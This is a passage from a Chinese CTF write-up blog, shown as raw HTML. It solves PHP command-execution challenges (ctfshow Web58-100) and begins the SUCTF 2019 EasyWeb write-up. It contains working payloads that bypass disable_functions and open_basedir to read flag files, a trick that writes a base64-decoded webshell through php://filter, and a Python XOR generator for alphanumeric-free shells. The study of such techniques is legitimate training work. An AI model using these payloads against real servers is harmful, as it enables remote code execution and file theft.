class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span> $<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>TODO:这题没尝试成功，待重试</p><h2 id="Web58-65-disable-functions-bypass"><a href="#Web58-65-disable-functions-bypass" class="headerlink" title="Web58-65 disable_functions bypass"></a>Web58-65 disable_functions bypass</h2><p>后面主要是绕过disable_functions思路，另起一篇文章吧，payload姑且记记，哪天抄类似的时候可能用得上。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web66-70"><a href="#Web66-70" class="headerlink" title="Web66-70"></a>Web66-70</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//得到缓冲区的数据。</span>    <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。</span>    <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p></blockquote><p>所以在缓冲区关闭之前退出程序：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Web72-open-basedir-bypass"><a href="#Web72-open-basedir-bypass" class="headerlink" title="Web72 open_basedir bypass"></a>Web72 open_basedir bypass</h2><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">参考链接</a></p><h2 id="Web73-74"><a href="#Web73-74" class="headerlink" title="Web73-74"></a>Web73-74</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">//先扫目录c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>//然后读取c=include("/flagc.txt");exit(0);c=require("/flagc.txt");exit(0);c=require_once("/flagc.txt");exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//先扫目录</span>c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//利用mysql load_file读取文件</span>c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web100-call-user-func"><a href="#Web100-call-user-func" class="headerlink" title="Web100 call_user_func"></a>Web100 call_user_func</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>is_numeric:指定的变量是<strong>数字</strong>和<strong>数字字符串</strong>(字符串内全是数字)则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即TRUE</p><p>7.x：<code>is_number()</code>对16进制数字不返回TRUE</p></blockquote><p>所以转换成能够返回True的数字字符串。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;&#96;cat *&#96;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进行base64编码：</p><pre class="line-numbers language-none"><code class="language-none">PD89YGNhdCAqYDs&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>去掉补位的<code>=</code></p><pre class="line-numbers language-none"><code class="language-none">PD89YGNhdCAqYDs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>转换为16进制</p><pre class="line-numbers language-none"><code class="language-none">5044383959474e6864434171594473<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64编码为<code>a-zA-Z0-9/=</code>，大部分为数字，所以得碰运气。而且<strong>如果中间有字母e，那么完全会被is_numberic当成科学计数法</strong>。</p><p>所以尽量凑出中间有e的纯数字字符串。</p><pre class="line-numbers language-none"><code class="language-none">GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php POST:v1&#x3D;hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[SUCTF 2019]EasyWeb</title>
      <link href="/p/745812677.html"/>
      <url>/p/745812677.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是一道做过的题。easy，但不完全easy。</p><p>代码审计题</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// webadmin will remove your upload file every 20 min!!!!</span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/tmp_"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-无字母数字shell构造"><a href="#1-无字母数字shell构造" class="headerlink" title="1.无字母数字shell构造"></a>1.无字母数字shell构造</h3><p>思路源于p神的文章：<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>因为屏蔽了字母数字，可以思路可以往无字母数字getshell上走，大致有：或，异或，取反三个方案。</p><p>因为检测~，所以取反不可行。</p><p>于是跑脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token comment"># Python中正则不需要在首位加//</span>preg <span class="token operator">=</span> <span class="token string">'[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+'</span>payload <span class="token operator">=</span> <span class="token string">"_GET"</span>istr <span class="token operator">=</span> <span class="token string">''</span>jstr <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>    check <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment">#“Use of undefined constant” 视ascii码大于0x7f的字符为字符串，7.2后提出要废弃</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span> <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span>preg<span class="token punctuation">,</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    i <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    j <span class="token operator">=</span> <span class="token string">'%&#123;:0>2&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    istr <span class="token operator">+=</span> i                    jstr <span class="token operator">+=</span> j                    check <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">break</span>        <span class="token keyword">if</span> check <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token comment"># php经典特性，没加引号则视为字符串，所以可以不加引号减少字符数</span><span class="token comment"># abc^def等价于(a^d).(b^e).(c^f),前者可以大幅减少字符数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'$&#123;%s^%s&#125;'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>istr<span class="token punctuation">,</span> jstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" 